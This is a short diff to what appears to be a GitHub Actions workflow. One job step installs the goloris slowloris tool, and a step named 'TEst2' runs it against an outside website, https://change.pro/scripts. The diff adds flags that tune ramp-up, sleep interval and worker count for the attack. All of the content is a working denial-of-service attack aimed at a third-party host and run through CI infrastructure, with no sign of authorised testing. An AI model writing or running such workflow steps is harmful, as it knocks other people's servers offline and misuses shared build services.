@@ -25,4 +25,4 @@ jobs:
       run: go install github.com/valyala/goloris@latest
     
     - name: TEst2
-      run: goloris -victimUrl https://change.pro/scripts
+      run: goloris -victimUrl https://change.pro/scripts -rampUpInterval 10s -sleepInterval 100s -dialWorkersCount 1
